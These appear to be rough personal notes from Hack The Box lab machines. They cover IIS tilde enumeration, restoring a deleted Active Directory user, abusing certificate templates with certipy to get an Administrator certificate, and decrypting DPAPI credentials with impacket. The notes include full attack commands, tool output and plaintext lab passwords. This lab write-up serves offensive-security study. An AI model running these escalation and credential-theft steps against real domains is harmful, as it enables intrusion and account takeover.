___


henry / H3nry_987TGV!


has an IIS server on port 80


john has remote management access 



*triggering errors in windows IIS*

a.aspx
&&&
trace.axd
1~.rem


try to use DEBUG http method

*enumerates a lot of these*
BurpSuite Extension — IIS Tilde Enumeration Scanner.


*extension found vuln perf*


*found dirs*

http://10.10.11.72/aspnet_client/

http://10.10.11.72/aspnet_client/system_web/

http://10.10.11.72/aspnet_client/system_web/4_0_30319/

this last one is the version of  asp-net running on the machine

CLR -> common language runtime



*I should have run bloodhound *




do hack the box persistent or persistence box after this I think it has to do with IIS



*alfred pass*
?:basketball



*list all deleted user objects*
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *


*restored one of the deleted objects*
Restore-ADObject -Identity 'CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb'




```
certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'Abc123456@' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```



```
certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'Abc123456@' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'tombwatcher\Administrator'
```


```
❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

```







*decrypting master key for DPAPI*
└> dpapi.py masterkey -file ./08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid 'S-1-5-21-3927696377-1337352550-2781715495-1110' 
/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83





*decrypt credential file with master key*
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83' 
/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m






